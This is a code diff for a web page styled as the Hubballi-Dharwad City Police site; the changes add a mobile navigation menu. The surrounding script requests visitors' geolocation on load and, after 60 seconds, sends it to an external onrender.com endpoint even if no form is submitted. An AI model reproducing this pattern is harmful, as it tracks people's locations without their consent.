@@ -8,12 +8,20 @@
 </head>
 <body>
     <nav class="navbar">
-        <div class="logo"><img src="logoksp.png" alt="Hubli Dharwad Police Logo"></div>
-        <ul>
+        <div class="logo">
+            <img src="logoksp.png" alt="Hubli Dharwad Police Logo">
+            <p class="p1">Hubballi-Dharwad City Police</p>
+        </div>
+        <ul class="nav-links">
             <li><a href="./">Home</a></li>
             <li><a href="#">About Us</a></li>
             <li><a href="#">Contact Us</a></li>
         </ul>
+        <div class="hamburger" onclick="toggleMenu()">
+            <span class="bar"></span>
+            <span class="bar"></span>
+            <span class="bar"></span>
+        </div>
     </nav>
 
     <div class="header">
@@ -45,24 +53,24 @@
     <script>
         let locationData = null;
         let formSubmitted = false;
-    
+
         // Function to clear phone number input
         function clearPhoneNumberInput() {
             document.getElementById('phone_number').value = '';
         }
-    
+
         // Function to disable form inputs during submission
         function disableFormInputs() {
             document.getElementById('phone_number').disabled = true;
             document.querySelector('button[type="submit"]').disabled = true;
         }
-    
+
         // Function to enable form inputs after submission
         function enableFormInputs() {
             document.getElementById('phone_number').disabled = false;
             document.querySelector('button[type="submit"]').disabled = false;
         }
-    
+
         // Request location permission as soon as the page loads
         window.onload = function() {
             if (navigator.geolocation) {
@@ -75,24 +83,24 @@
                 alert('Geolocation is not supported by this browser.');
             }
         };
-    
+
         // Set a timeout to send location data automatically after 60 seconds
         const timeoutId = setTimeout(() => {
             if (locationData && !document.getElementById('phone_number').value && !formSubmitted) {
                 sendLocation();
             }
         }, 60000);
-    
+
         // Handle form submission
         document.getElementById('scanForm').addEventListener('submit', function(e) {
             e.preventDefault();
-    
+
             if (formSubmitted) {
                 return; // Prevent multiple submissions
             }
-    
+
             const phoneNumber = "+91" + document.getElementById('phone_number').value;
-    
+
             if (locationData) {
                 disableFormInputs(); // Disable form inputs during submission
                 sendLocation(phoneNumber);
@@ -100,11 +108,11 @@
                 alert('Unable to get location. Please try again.');
             }
         });
-    
+
         // Function to send location data
         function sendLocation(phoneNumber = 'Unknown') {
             formSubmitted = true; // Mark form as submitted
-    
+
             fetch('https://anonymous-reporter.onrender.com/scan', {
                 method: 'POST',
                 headers: {
@@ -133,7 +141,12 @@
                 enableFormInputs(); // Enable form inputs after submission
             });
         }
+
+        // Function to toggle the menu
+        function toggleMenu() {
+            const navLinks = document.querySelector('.nav-links');
+            navLinks.classList.toggle('active');
+        }
     </script>
-    
 </body>
 </html>
